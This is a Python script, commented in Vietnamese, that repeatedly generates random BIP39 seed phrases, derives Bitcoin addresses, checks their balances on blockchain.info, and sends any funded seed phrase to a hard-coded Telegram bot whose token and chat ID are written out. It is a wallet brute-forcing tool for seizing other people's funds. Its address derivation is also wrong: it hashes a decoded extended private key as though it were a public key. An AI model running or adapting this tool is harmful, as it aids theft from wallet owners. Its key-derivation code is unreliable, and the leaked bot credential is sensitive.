import hashlib
import base58
import bech32
import requests
import time
import json
import urllib.parse
from mnemonic import Mnemonic
from Crypto.Hash import RIPEMD

# Thay đổi token của bot và chat_id của bạn
TELEGRAM_TOKEN = '7284153117:AAEZUN5wJNHcNLHXQq6J09aLa_8cB_P59yk'
TELEGRAM_CHAT_ID = '6578481782'  # Thay thế bằng ID chat của bạn

def load_config():
    with open('settings.json', 'r', encoding='utf-8') as f:
        return json.load(f)

def save_config(config):
    with open('settings.json', 'w', encoding='utf-8') as f:
        json.dump(config, f, ensure_ascii=False)
    print("Config saved")

def hash160(data):
    sha = hashlib.sha256(data).digest()
    rip = RIPEMD.new(sha).digest()
    return rip

def checksum(data):
    sha256_1 = hashlib.sha256(data).digest()
    sha256_2 = hashlib.sha256(sha256_1).digest()
    return sha256_2[:4]

def encode_base58_check(data):
    return base58.b58encode(data + checksum(data))

def public_key_to_p2pkh(public_key):
    key_hash = hash160(public_key)
    return encode_base58_check(b'\x00' + key_hash).decode('utf-8')

def public_key_to_p2sh(public_key):
    key_hash = hash160(public_key)
    return encode_base58_check(b'\x05' + key_hash).decode('utf-8')

def public_key_to_bech32(public_key):
    key_hash = hash160(public_key)
    witness_version = 0
    return bech32.encode('bc', witness_version, key_hash)

def public_key_to_address(public_key):
    try:
        public_key_bytes = base58.b58decode(public_key)

        p2pkh_address = public_key_to_p2pkh(public_key_bytes)
        p2sh_address = public_key_to_p2sh(public_key_bytes)
        bech32_address = public_key_to_bech32(public_key_bytes)

        return p2pkh_address, p2sh_address, bech32_address
    except Exception as e:
        print(f"Error converting public key: {e}")
        return None, None, None

def send_message_to_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()
        print("Successfully sent message to Telegram")
    except requests.exceptions.HTTPError as http_err:
        print(f"HTTP error occurred: {http_err}")
        print(f"Response content: {response.content}")
    except requests.exceptions.RequestException as req_err:
        print(f"Error occurred: {req_err}")

def send_file_to_telegram(file_path):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument'
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': TELEGRAM_CHAT_ID}
    try:
        response = requests.post(url, files=files, data=data)
        response.raise_for_status()
        print("Successfully sent file to Telegram")
    except requests.exceptions.HTTPError as http_err:
        print(f"HTTP error occurred: {http_err}")
        print(f"Response content: {response.content}")
    except requests.exceptions.RequestException as req_err:
        print(f"Error occurred: {req_err}")

def request_balances(stringaddress, addresses, mnemonics):
    try:
        url = f'https://blockchain.info/balance?active={stringaddress}'
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        
        content = ""  # Initialize an empty string to hold the content
        
        for address, mnemonic in zip(addresses, mnemonics):
            balance = data.get(address, {}).get('final_balance', 0) / 100000000
            if balance > 0:
                print(f'Balance: {balance} BTC')
                print(f'Mnemonic: {mnemonic}')
                print(f'Address: {address}')
                
                # Append the content to the string
                content += f"Mnemonic: {mnemonic}, Address: {address}, Balance: {balance} BTC\n"
        
        if content:
            # Lưu nội dung vào tệp văn bản nếu có địa chỉ với số dư lớn hơn 0
            file_path = 'wallet_info.txt'
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(content)
            
            # Gửi tệp văn bản đến Telegram
            send_file_to_telegram(file_path)
        else:
            print("No addresses with a balance greater than 0.")
            
    except requests.exceptions.HTTPError as http_err:
        if response.status_code == 429:
            print(f"Error: API request failed with status code 429 (rate limit exceeded). Waiting 60 seconds before retrying...")
            time.sleep(60)
            request_balances(stringaddress, addresses, mnemonics)
        else:
            print(f"HTTP error: {http_err}")
    except requests.exceptions.RequestException as err:
        print(f"Request error: {err}")
    except json.JSONDecodeError:
        print(f"Error: Invalid JSON response for address {address}")
    except Exception as e:
        print(f"Error: {e}. Restarting program in 5 seconds...")
        time.sleep(5)

def get_address_info(addresses, mnemonics):
    stringaddress = urllib.parse.quote_plus('|'.join(addresses))
    request_balances(stringaddress, addresses, mnemonics)

def main():
    config = load_config()
    checked = config.get('checked', 0)
    speed = config.get("speed", 1)
    batch_size = config.get("batch_size", 50)

    # Gửi tin nhắn kiểm tra kết nối ban đầu
    send_message_to_telegram("Bot started and ready to send wallet info!")
    
    while True:
        mnemonics = []
        addresses = []
        while checked < ((checked // batch_size) + ((checked % batch_size != 0) * 1)) * batch_size:
            mnemo = Mnemonic("italian").generate(strength=128)
            print(f"Wallet checked {checked}: {mnemo}")
            private_key = Mnemonic.to_seed(mnemo, passphrase='')
            public_key = Mnemonic.to_hd_master_key(private_key)
            p2pkh_address, p2sh_address, bech32_address = public_key_to_address(public_key)

            if p2pkh_address and p2sh_address and bech32_address:
                mnemonics.extend([mnemo, mnemo, mnemo])
                addresses.extend([p2pkh_address, p2sh_address, bech32_address])

            checked += 1
            time.sleep(speed)

        config['checked'] = checked
        save_config(config)
        
        checked += 1
        get_address_info(addresses, mnemonics)

if __name__ == "__main__":
    main()
